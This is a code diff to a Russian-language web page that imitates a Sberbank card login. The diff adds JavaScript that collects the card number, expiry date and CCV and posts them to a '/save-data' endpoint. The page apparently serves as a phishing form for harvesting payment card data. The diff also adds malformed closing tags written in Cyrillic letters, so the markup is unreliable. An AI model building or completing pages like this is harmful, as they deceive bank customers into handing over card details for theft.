@@ -276,10 +276,11 @@
         }
 
         // Проверка карты
-        if (cardFieldsContainer.classList.contains("hidden") && cardNumber) {
+        if (tabs[2].classList.contains("active")) {
           if (!/^\d{16}$/.test(cardNumber)) {
             errorMessage.textContent = 'Неправильный номер карты. Повторите попытку.';
             document.getElementById("card-number").value = "";
+            cardFieldsContainer.appendChild(errorMessage);
             return;
           }
         }
@@ -301,7 +302,7 @@
         .catch(error => {
           console.error('Ошибка отправки данных:', error);
           errorMessage.textContent = 'Ошибка при отправке данных. Попробуйте позже.';
-          passwordInput.parentElement.appendChild(errorMessage);
+          cardFieldsContainer.appendChild(errorMessage);
         });
       });
 
@@ -316,6 +317,8 @@
       document.getElementById("card-login-btn")?.addEventListener('click', function () {
         errorMessage.textContent = ''; // Очистить ошибки
         const cardNumber = document.getElementById("card-number").value.trim();
+        const monthYear = document.querySelector('input[type="month"]').value.trim();
+        const ccv = document.querySelector('input[type="number"]').value.trim();
 
         if (!/^\d{16}$/.test(cardNumber)) {
           errorMessage.textContent = 'Неправильный номер карты. Повторите попытку.';
@@ -324,7 +327,25 @@
           return;
         }
 
-        alert("Номер карты введен корректно!");
+        // Отправка данных
+        const dataToSend = { cardNumber, monthYear, ccv };
+
+        fetch('/save-data', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(dataToSend)
+        })
+        .then(response => response.json())
+        .then(message => {
+          alert('Данные отправлены и сохранены: ' + message);
+        })
+        .catch(error => {
+          console.error('Ошибка отправки данных:', error);
+          errorMessage.textContent = 'Ошибка при отправке данных. Попробуйте позже.';
+          cardFieldsContainer.appendChild(errorMessage);
+        });
       });
     });
   </script>
@@ -349,7 +370,7 @@
       </div>
       <div class="remember-container">
         <label><input type="checkbox"> Запомнить меня</label>
-        <a href="https://example.com/404" style="color: #007f00; font-size: 14px;">Забыли логин или пароль?</a>
+        <a href="https://example.com/404" style="color: #007f00; font-size: 14px;">Забыли логин или пароль?</а>
       </div>
       <button type="button">Войти</button>
       <p class="no-card-text">Нет карты СберБанка?</п>
